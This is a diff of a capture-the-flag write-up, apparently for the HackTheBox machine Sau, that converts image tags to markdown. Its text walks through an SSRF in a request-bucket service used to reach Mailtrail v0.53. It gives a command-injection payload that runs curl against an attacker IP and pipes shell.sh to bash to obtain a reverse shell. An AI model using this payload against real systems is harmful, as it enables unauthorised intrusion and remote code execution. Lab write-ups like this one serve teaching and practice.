@@ -23,19 +23,19 @@ Port 80 is being filtered, while port 55555 is open.
 
 Port 55555 hosted an application that is able to collect and inspect HTTP requests:
 
-<figure><img src="../../.gitbook/assets/image (3310).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3310).png>)
 
 We can create one by clicking on create:
 
-<figure><img src="../../.gitbook/assets/image (1199).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1199).png>)
 
 Tihs acts similar to a webhook, and is able to retrieve requests sent to that unique URL.
 
-<figure><img src="../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1200).png>)
 
 We are able to set the Responses from the website. as well as where the traffic is being forwarded to, just like we can with Webhooks. Setting the Forward URL to our own HTTP server results in requests being sent there from the machine.
 
-<figure><img src="../../.gitbook/assets/image (1194).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1194).png>)
 
 Since port 80 was being filtered, we can set it to `http://localhost` and try setting all the options to True. Afterwards, sending GET requests to our bucket would result in HTML being returned:
 
@@ -55,15 +55,13 @@ At the bottom, we can see that port 80 has Mailtrail v0.53 running, which is vul
 
 To exploit this, we just need to change the forward URL to `http://127.0.0.1/login` and send a POST request via `curl` with a payload like this:
 
-{% code overflow="wrap" %}
 ```bash
 $ curl -X POST --data 'username=;`curl 10.10.14.31/shell.sh|bash`' http://10.129.22.88:55555/test
 ```
-{% endcode %}
 
 We would get a reverse shell as `puma`:
 
-<figure><img src="../../.gitbook/assets/image (2380).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2380).png>)
 
 ## Privilege Escalation
 
@@ -83,6 +81,6 @@ User puma may run the following commands on sau:
 
 This is easily exploitable to get a `root` shell:
 
-<figure><img src="../../.gitbook/assets/image (1460).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1460).png>)
 
 Rooted!
